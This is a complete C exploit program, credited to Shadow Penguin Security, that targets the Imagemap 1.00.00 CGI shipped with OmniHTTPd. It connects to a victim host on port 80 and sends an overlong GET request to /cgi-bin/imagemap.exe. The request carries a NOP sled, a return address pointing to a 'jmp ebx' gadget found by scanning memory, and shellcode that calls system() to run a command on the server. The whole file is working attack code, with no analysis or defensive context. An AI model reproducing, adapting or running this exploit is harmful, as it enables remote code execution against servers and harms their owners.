/*=============================================================================
   Imagemap 1.00.00 CGI Exploit (Distributed with OmniHTTPd 1.01 and Pro2.04)
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/
#include    <stdio.h>
#include    <string.h>
#include    <windows.h> 
#include    <winsock.h>

#define     MAXBUF          2000
#define     RETADR          348
#define     JMPADR          344
#define     HTTP_PORT       80

unsigned int mems[]={
0xBFB50000, 0xBFB72FFF,  0xBFDE0000, 0xBFDE5FFF,
0xBFE00000, 0xBFE0FFFF,  0xBFE30000, 0xBFE42FFF,
0xBFE80000, 0xBFE85FFF,  0xBFE90000, 0xBFE95FFF,
0xBFEA0000, 0xBFF1EFFF,  0xBFF20000, 0xBFF46FFF,
0xBFF50000, 0xBFF60FFF,  0xBFF70000, 0xBFFC5FFF,
0xBFFC9000, 0xBFFE2FFF,
0,0};

unsigned char exploit_code[200]={
0xEB,0x32,0x5B,0x53,0x32,0xE4,0x83,0xC3,
0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
0xBF,0xFF,0xD0,0x43,0x53,0x50,0x32,0xE4,
0x83,0xC3,0x06,0x88,0x23,0xB8,0x28,0x6E,
0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x43,0x53,
0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,
0xD6,0x90,0xEB,0xFD,0xE8,0xC9,0xFF,0xFF,
0xFF,0x00
};

unsigned char cmdbuf[200]="msvcrt.dll.system.welcome.exe";

unsigned int search_mem(unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
    unsigned int    adr;

    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
            adr=(unsigned int)p;
            if ((adr&0xff)==0) continue;
            if (((adr>>8)&0xff)==0) continue;
            if (((adr>>16)&0xff)==0) continue;
            if (((adr>>24)&0xff)==0) continue;
            return(adr);
        }
    return(0);
}

main(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         i,ip,p1,p2;
    static unsigned char buf[MAXBUF],packetbuf[MAXBUF+1000];
    struct hostent       *hs;

    if (argc<2){
        printf("usage: %s VictimHost\n",argv[0]); return -1;
    }
    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        printf("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        printf("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)HTTP_PORT);
    if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        printf("Can not connect to specified host.\n"); return -1;
    }
    memset(buf,0x90,MAXBUF); buf[MAXBUF]=0;
    for (i=0;;i+=2){
        if (mems[i]==0) return FALSE;
        if ((ip=search_mem((unsigned char *)mems[i],
            (unsigned char *)mems[i+1],0xff,0xe3))!=0) break;
    }
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;
    buf[JMPADR  ]=0xeb;
    buf[JMPADR+1]=0x06;

    strcat(exploit_code,cmdbuf);
    p1=(unsigned int)LoadLibrary;
    p2=(unsigned int)GetProcAddress;
    exploit_code[0x0d]=p1&0xff;
    exploit_code[0x0e]=(p1>>8)&0xff;
    exploit_code[0x0f]=(p1>>16)&0xff;
    exploit_code[0x10]=(p1>>24)&0xff;
    exploit_code[0x1e]=p2&0xff;
    exploit_code[0x1f]=(p2>>8)&0xff;
    exploit_code[0x20]=(p2>>16)&0xff;
    exploit_code[0x21]=(p2>>24)&0xff;

    memcpy(buf+RETADR+4,exploit_code,strlen(exploit_code));
    sprintf(packetbuf,"GET /cgi-bin/imagemap.exe?%s\r\n\r\n",buf);
    send(sock,packetbuf,strlen(packetbuf),0);
    closesocket(sock);
    printf("Done.\n");
    return FALSE;
}






